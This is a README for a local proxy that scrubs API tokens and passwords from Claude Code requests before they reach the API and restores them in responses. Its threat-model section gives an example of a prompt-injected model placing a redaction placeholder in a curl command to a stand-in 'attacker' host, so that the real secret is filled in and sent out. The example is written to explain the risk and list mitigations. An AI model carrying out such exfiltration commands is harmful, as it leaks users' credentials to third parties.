# llm-redact-proxy

A local proxy that sits between your LLM client (Claude Code today) and
`api.anthropic.com` and scrubs vital PII — API tokens, passwords, account
numbers — from every outbound request before it leaves your machine.
Powered by the MLX 8-bit OpenAI Privacy Filter
([independent benchmarks](https://github.com/CupOfGeo/opf-benchmarks-geo)).

```
Claude Code ──http──▶ llm-redact-proxy (127.0.0.1:8787) ──https──▶ api.anthropic.com
                          │
                          ├─ layer 1: regex floor (~35 formats from gitleaks' ruleset:
                          │    OpenAI/Anthropic/HF, AWS/GCP/Azure, GitHub/GitLab, Slack,
                          │    Stripe, npm/PyPI, Vault, JWTs, PEM blocks, URL creds, ...)
                          └─ layer 2: OPF MLX model (secret, account_number spans)
```

Requires Apple Silicon (the OPF model runs via MLX).

## Usage

One-off (foreground):

```bash
just proxy                                        # loads model, listens on :8787
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude   # in another terminal
```

As a login service (starts at login, auto-restarts via launchd):

```bash
just proxy-install     # writes ~/Library/LaunchAgents/com.llm.redact-proxy.plist
just proxy-status      # health check
just proxy-uninstall
```

Fail-closed shell wrapper — plain `claude` routes through the proxy and
refuses to run (with a clear error) when the proxy is down; `claude-raw`
is the deliberate unprotected bypass:

```zsh
# in your zshrc
source ~/Code/llm-redact-proxy/claude-wrapper.zsh
```

## Design notes

- **Deterministic placeholders** (`⟨REDACTED:secret:a1b2c3⟩`, hash-keyed):
  the same secret always redacts identically, so prompt caching survives
  and the model can reason about "that token" without seeing it.
- **Incremental scanning**: results are cached per content block, so only
  the new tail of each request pays OPF inference (cache hits are
  milliseconds; cold text costs roughly 0.7 s per 6 KB on M-series).
- **Refuses rather than mangles**: if redaction ever changes a request's
  structure (message/block counts, tool ids) the proxy returns a clear
  error instead of forwarding — and a clear 502 when the upstream is
  unreachable.
- **Fail-safe layering**: the regex floor runs on raw bytes and cannot
  fail; if the OPF pass errors, the floor still holds.
- **Nothing sensitive is logged** — categories and counts only.
- Default categories are `secret` and `account_number`. Person/email/date
  are deliberately not redacted (that would cripple ordinary coding work).
  Override with `OPF_PROXY_CATEGORIES`, comma-separated from: `secret`,
  `account_number`, `person`, `email`, `phone`, `address`, `date`, `url` —
  e.g. `OPF_PROXY_CATEGORIES=secret just proxy`.
  The regex floor for known token formats always runs regardless.

## Un-redaction, and the threat model

Responses are un-redacted on the way back. The proxy keeps the
placeholder → value map **in memory only** (never on disk) and restores real
values in non-streaming bodies and in SSE streams — text, thinking and
tool-input deltas, even when a placeholder is split across events or byte
chunks — so files and commands the model writes contain working credentials
while the API only ever sees placeholders. Round trips are stable: a value
read back from disk re-redacts to the identical placeholder, so the
API-side conversation and prompt cache never change.

**On by default.** `OPF_PROXY_UNREDACT=0` gives *awareness mode*: you see
exactly what the model saw.

Threat model, plainly: un-redaction makes the proxy a rehydration oracle for
every secret it has seen this process lifetime. A prompt-injected model that
emits a placeholder inside a locally executed tool call
(`curl -H "Authorization: ⟨REDACTED:secret:…⟩" https://attacker/…`) gets
the real value restored into that command. The API still never sees the
secret — the exposure is the same as running the tool without the proxy.
Mitigations: keep permission prompts on for network-touching commands, use
awareness mode when working with untrusted content, and note the map is
bounded (4096 entries) and cleared on restart — after which old
placeholders pass through unrestored until the secret transits outbound
again. Placeholders the client truncates or re-wraps hash differently and
are not restored.

## Limits (honest ones)

- This is a *mitigation*, not a guarantee: OPF's `secret` recall is not
  100% (see [the benchmarks](https://github.com/CupOfGeo/opf-benchmarks-geo)).
  The regex floor covers known token formats; novel secret shapes in prose
  can still slip through.
- Long single-line texts (minified JSON, base64) are hard-split into
  ≤6 KB pieces for the model; a freeform secret straddling a cut can be
  missed by OPF (known token formats are unaffected — the regex floor
  sees the whole text).
- The raw secret does reach the local Claude Code process — it is scrubbed
  from the copy sent to the API. The model may visibly see placeholders.
- Env-based `ANTHROPIC_BASE_URL` can change how the CLI picks its auth
  source (it warns about claude.ai connectors); check your login flow.

## Roadmap

See [ROADMAP.md](ROADMAP.md) for planned features and the testing backlog.
